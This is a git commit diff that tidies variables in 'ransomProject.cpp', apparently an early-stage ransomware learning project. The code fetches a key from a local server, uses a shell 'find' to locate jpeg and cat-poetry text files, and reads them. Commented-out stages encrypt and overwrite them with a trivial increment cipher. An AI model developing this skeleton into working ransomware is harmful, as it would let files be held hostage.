b57edc5ea9dca3d6cf289e82807e6974ecaf0305
Chris Dixon <chris_dixon1989@hotmail.com>
2021-08-09 06:23:42 -0700

    tidied some variables

--- ransomProject.cpp
+++ ransomProject.cpp
@@ -4,39 +4,32 @@
 #include <vector>
 #include "ransomMethods.h"
 
-
-using namespace std;
-
-
 int main(){  
-
 	std::vector<std::string> fileLocationsVector;
-	std::vector<std::string> temporaryVector; // TODO - Move to function.
 	std::vector<std::vector<std::string>> fileContentVector;
-
 	std::string serverStoredLocations = get_request("http://127.0.0.1:5000/locations");
 	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");
 
-	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.	
+	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.
+
+
+	// TODO - Create function that compares fileLocationsVector with serverStoredLocations and removes already stored locations.
+
 	
-	if(getFileContents("fileLocations", fileLocationsVector)){		 // Read file locations into a string vector.
-		for(string& location : fileLocationsVector){
-			if(getFileContents(location, temporaryVector)){			 // Read contens of each location into its own into its own string vector.
+	if(getFileContents("fileLocations", fileLocationsVector)){ // Read file locations into a string vector.			
+		for(std::string& location : fileLocationsVector){
+			std::vector<std::string> temporaryVector;
+			if(getFileContents(location, temporaryVector)){	   // Read contens of each location into its own into its own string vector.
 				fileContentVector.push_back(temporaryVector);
 				temporaryVector.clear();		
 			}			
-		}	
-    	
+		}
     }
 
-
-
-	
-
 	/*	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
-	for(vector<std::string>& a: fileContentVector){
-		for(string& b : a){
-			basicEncryptContent(b);
+	for(vector<std::string>& file: fileContentVector){
+		for(string& line : file){
+			basicEncryptContent(line);
 		}
 	}*/
 
@@ -56,14 +49,14 @@ int main(){
 
 
 	/*	// DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
-	for(vector<std::string>& a: fileContentVector){
-		for(string& b : a){
-			basicDecryptContent(b);
+	for(vector<std::string>& file: fileContentVector){
+		for(string& line : file){
+			basicDecryptContent(line);
 		}
 	}*/    
 	
 
-/*	// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.
+	/*	// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.
 	// Move to function
 	ofstream myFile;
 	for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
